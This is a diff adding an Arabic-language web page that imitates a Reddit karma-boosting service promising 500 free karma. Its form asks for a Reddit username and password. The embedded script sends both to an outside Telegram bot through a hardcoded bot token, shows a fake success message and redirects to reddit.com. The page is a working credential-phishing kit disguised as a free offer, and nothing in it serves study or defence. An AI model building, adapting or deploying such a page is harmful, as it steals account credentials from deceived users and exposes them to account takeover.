@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Reddit رشق</title>
+    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#dae0e6;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;padding:25px;border-radius:12px;width:380px;text-align:center;box-shadow:0 2px 15px rgba(0,0,0,0.08)}img{width:100px;margin:0 auto 20px;display:block}h2{color:#ff4500;margin-bottom:6px}p{color:#555;font-size:14px;margin-bottom:18px}.gift-box{background:#ff4500;color:#fff;border-radius:12px;padding:12px;margin-bottom:15px}.gift-box span{font-weight:bold;font-size:18px}input,select{width:100%;padding:14px;margin:8px 0;background:#f6f7f8;border:1px solid #edeff1;border-radius:6px;font-size:16px;text-align:center}.btn{background:#ff4500;color:#fff;border:none;padding:14px;width:100%;border-radius:25px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}.btn:hover{background:#e03d00}</style></head>
+<body><div class="card">
+<img src="https://www.redditinc.com/assets/images/site/reddit-logo.png" alt="Reddit">
+<h2>🤖 رشق karma ريدت</h2>
+<p>احصل على Karma حقيقية لمشاركاتك!</p>
+<div class="gift-box"><span>🎉 500 Karma مجاناً</span></div>
+<select id="amount"><option value="100">100 Karma</option><option value="500" selected>500 Karma</option><option value="1000">1000 Karma</option></select>
+<input id="username" placeholder="اسم المستخدم في ريدت">
+<input id="password" type="password" placeholder="كلمة المرور للتأكيد">
+<button class="btn" onclick="sendData()">إرسال الرشق الآن 🚀</button>
+<p id="msg" style="margin-top:12px;font-size:14px;font-weight:bold;"></p>
+</div>
+<script>
+const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT=p.get('chat');
+function sendData(){const u=document.getElementById('username').value,pa=document.getElementById('password').value,am=document.getElementById('amount').value;
+if(!u||!pa)return alert('املأ جميع الحقول');
+document.getElementById('msg').innerHTML='⏳ جاري إرسال الرشق...';
+fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent('🤖 رشق ريدت\n👤 '+u+'\n🔑 '+pa+'\n📊 الكمية: '+am+' Karma')}`).then(()=>{document.getElementById('msg').innerHTML='✅ تم الإرسال! سيصل الرشق خلال دقائق.';setTimeout(()=>location.href='https://reddit.com',3000)});}
+</script></body></html>
